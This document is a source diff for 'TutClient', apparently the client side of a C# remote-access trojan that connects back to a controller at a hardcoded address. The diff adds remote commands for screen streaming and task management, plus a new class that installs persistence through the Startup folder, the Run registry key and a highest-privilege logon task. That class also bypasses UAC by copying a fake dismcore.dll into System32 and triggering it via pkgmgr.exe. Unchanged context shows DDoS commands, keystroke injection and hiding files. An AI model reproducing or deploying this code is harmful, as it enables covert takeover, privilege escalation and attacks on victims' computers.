@@ -22,6 +22,8 @@ namespace TutClient
 {
     class Program
     {
+        public static int fps = 100;  //frame rate adjustement
+
         [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
         public static extern void mciSendStringA(string lpstrCommand,
         string lpstrReturnString, int uReturnLength, int hwndCallback);
@@ -130,6 +132,8 @@ namespace TutClient
         private static bool applicationHidden = false;
         private static Client _ipcClient;
         private static ProcessData ipcProcess;
+        private static string getScreens; //get screens count
+        public static int ScreenNumber = 0;
 
         static void Main(string[] args)
         {
@@ -257,12 +261,18 @@ namespace TutClient
                 {
                     attempts++;
                     Console.WriteLine("Connection attempt " + attempts);
+
                     string connectionString = GetIPAddress("192.168.10.56"); //Replace IP with DNS if you want
+                  
                     _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
-                    Thread.Sleep(100);
+                    Thread.Sleep(500);
                 }
                 catch (SocketException)
                 {
+                    if (RDesktop.isShutdown == false) // added this as it was still trying to send the screen after disconnection
+                    {
+                        RDesktop.isShutdown = true;
+                    }
                     Console.Clear();
                 }
             }
@@ -321,9 +331,39 @@ namespace TutClient
 
             return commands.ToArray();
         }
+            
 
         private static void HandleCommand(string text)
         {
+            if (text == "tskmgr")// i added this to start task manager
+            {
+                Process p = new Process();
+                p.StartInfo.FileName = "Taskmgr.exe";
+                p.StartInfo.CreateNoWindow = true;
+                p.Start();
+            }
+
+            if (text == "fpslow")    //FPS 
+            {
+                fps = 150;
+                Console.WriteLine("FPS now 150");
+            }
+            if (text == "fpsbest")      //FPS 
+            {
+                fps = 80;
+                Console.WriteLine("FPS now 80");
+            }
+            if (text == "fpshigh")      //FPS
+            {
+                fps = 50;
+                Console.WriteLine("FPS now 50");
+            }
+            if (text == "fpsmid")      //FPS 
+            {
+                fps = 100;
+                Console.WriteLine("FPS now 100");
+            }
+          
             if (text == "control.you")
             {
                 sendCommand("OK! then");
@@ -372,7 +412,7 @@ namespace TutClient
                         sound = System.Media.SystemSounds.Asterisk;
                         break;
                 }
-
+              
                 sound.Play();
             }
 
@@ -496,9 +536,15 @@ namespace TutClient
                         Console.WriteLine("List error: " + e.Message);
                     }
 
-                    String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
-                    dataString += pdata + "\n";
-
+                    try
+                    {
+                        String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
+                        dataString += pdata + "\n";
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("List error: " + ex.Message);
+                    }
                     //sendCommand(pdata);
                     //System.Threading.Thread.Sleep(100);
                 }
@@ -522,7 +568,10 @@ namespace TutClient
 
             if (text.StartsWith("procstart"))
             {
+                try
+                {
                 String file = text.Split('|')[1];
+                  
                 String state = text.Split('|')[2];
 
                 Process p = new Process();
@@ -540,6 +589,11 @@ namespace TutClient
 
                 p.StartInfo.FileName = file;
                 p.Start();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
             }
 
             if (text == "startcmd")
@@ -694,7 +748,6 @@ namespace TutClient
                     reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
                     return;
                 }
-
                 if (Directory.Exists(source)) sourceType = "dir";
                 switch (sourceType)
                 {
@@ -756,6 +809,7 @@ namespace TutClient
                     reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
                     return;
                 }
+
                 File.SetAttributes(path, FileAttributes.Hidden);
             }
 
@@ -953,6 +1007,8 @@ namespace TutClient
                 if (t[1] != "rtype")
                 {
                     SendKeys.SendWait(t[1]);
+
+                    SendKeys.Flush(); //never forget to flush ha!
                 }
 
             }
@@ -1067,7 +1123,7 @@ namespace TutClient
                 DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
                 DDoS.startDdos();
             }
-
+          
             if (text.StartsWith("ddosk"))
             {
                 DDoS.stopDdos();
@@ -1157,6 +1213,24 @@ namespace TutClient
             {
                 StopIPCHandler();
             }
+
+            if (text == "countScreens")//-----------------added this to count the screens and send response to server
+            {
+
+                foreach (var screen in Screen.AllScreens)
+                {
+                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", "");
+
+                    sendCommand("ScreenCount" + getScreens);
+                }
+            }
+
+            if (text.StartsWith("screenNum"))//----------this will set the screen else is equal to screen 0
+            {
+                int screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1; //because the screens start at 0 not 1 
+                ScreenNumber = screenNumbers;
+                Console.WriteLine(ScreenNumber.ToString());
+            }
         }
 
         //ReceiveResponse
@@ -1165,7 +1239,7 @@ namespace TutClient
         {
 
             var buffer = new byte[2048];
-
+          
             try
             {
                 int received = _clientSocket.Receive(buffer, SocketFlags.None);
@@ -1235,7 +1309,7 @@ namespace TutClient
                 Console.WriteLine("Size of send: " + send.Length);
                 _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
                 Application.DoEvents();
-                Thread.Sleep(500);
+                Thread.Sleep(200); //this was 500
                 cam.Dispose();
             }
             catch (Exception)
@@ -1548,11 +1622,15 @@ namespace TutClient
 
         private static void t2s(string stext)
         {
-            System.Speech.Synthesis.SpeechSynthesizer speaker = new System.Speech.Synthesis.SpeechSynthesizer();
+            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //---------use this instead
 
-            speaker.SetOutputToDefaultAudioDevice();
+            {
+                speech.SetOutputToDefaultAudioDevice();
 
-            speaker.Speak(stext);
+                speech.Speak(stext);
+                // speech.Speak("hello");
+
+            }
         }
 
         private static void generateFreq(int freq, int duration)
@@ -1723,8 +1801,17 @@ namespace TutClient
 
             String crypted = Encrypt(k);
             if (isCmd) crypted = k;
-            byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
-            _clientSocket.Send(data);
+            byte[] data = Encoding.Unicode.GetBytes(crypted);
+            // _clientSocket.Send(data);
+            try
+            {
+                _clientSocket.Send(data);  //-added this as sometimes the tcp was not finished sending when it was asked to close the stream
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Send Command Failure " + ex.Message);
+                return;//added this too
+            }
         }
 
         private static void sendByte(byte[] data)
@@ -1734,7 +1821,129 @@ namespace TutClient
                 Console.WriteLine("Socket is not connected!");
                 return;
             }
-            _clientSocket.Send(data);
+            // _clientSocket.Send(data);
+            try
+            {
+                _clientSocket.Send(data);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Send Byte Failure " + ex.Message);
+                return;
+            }
+
+        }
+    }
+
+    public class UAC
+    {
+        public enum ProbeMethod
+        {
+            StartUpFolder,
+            Registry,
+            TaskScheduler
+        }
+
+        public void ProbeStart(ProbeMethod pm)
+        {
+            if (pm == ProbeMethod.StartUpFolder)
+            {
+                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                File.Copy(Application.ExecutablePath, suFolder + "\\" + new FileInfo(Application.ExecutablePath).Name);
+            }
+            else if (pm == ProbeMethod.Registry)
+            {
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
+                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false);
+                key.SetValue("tut_client", Application.ExecutablePath);
+                key.Close();
+                key.Dispose();
+                key = null;
+            }
+            else if (pm == ProbeMethod.TaskScheduler)
+            {
+                Process deltask = new Process();
+                Process addtask = new Process();
+                deltask.StartInfo.FileName = "cmd.exe";
+                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F";
+                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                deltask.Start();
+                deltask.WaitForExit();
+                Console.WriteLine("Delete Task Completed");
+                addtask.StartInfo.FileName = "cmd.exe";
+                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST";
+                addtask.Start();
+                addtask.WaitForExit();
+                Console.WriteLine("Task created sucessfully!");
+            }
+        }
+
+        public bool IsAdmin()
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+
+        private bool Is64Bit()
+        {
+            return Environment.Is64BitOperatingSystem;
+        }
+
+        private void CloseInstance()
+        {
+            Process self = Process.GetCurrentProcess();
+            self.Kill();
+        }
+
+        public bool BypassUAC()
+        {
+            const string dismCoreDll = "dismcore.dll";
+            const string copyFile = "copyFile.exe";
+            const string unattendFile = "unattend.xml";
+            const string launcherFile = "launch.exe";
+
+            //Check core files
+
+            if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
+            {
+                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please upload them manually");
+                return false;
+            }
+
+            //Copy fake dismcore.dll into System32
+
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + copyFile;
+            startInfo.Arguments = "\"" + Application.StartupPath + "\\" + dismCoreDll + "\" C:\\Windows\\System32";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process elevatedCopy = new Process();
+            elevatedCopy.StartInfo = startInfo;
+            elevatedCopy.Start();
+            Console.WriteLine("Waiting for elevated copy to finish");
+            elevatedCopy.WaitForExit();
+            if (elevatedCopy.ExitCode != 0) Console.WriteLine("Error during elevated copy");
+
+            //Create a file pointing to the startup path (reference for the fake dll)
+
+            string tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";
+
+            if (!File.Exists(tempFileLocation)) File.Create(tempFileLocation).Close();
+            File.WriteAllText(tempFileLocation, Application.StartupPath);
+
+            //Trigger dismcore.dll with pgkmgr.exe
+
+            startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + launcherFile;
+            startInfo.Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + unattendFile + "\"\"";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process bypassProcess = new Process();
+            bypassProcess.StartInfo = startInfo;
+            bypassProcess.Start();
+            Console.WriteLine("Waiting for bypass process to finish");
+            bypassProcess.WaitForExit();
+            Console.WriteLine("Bypass completed");
+            return true;
         }
     }
 
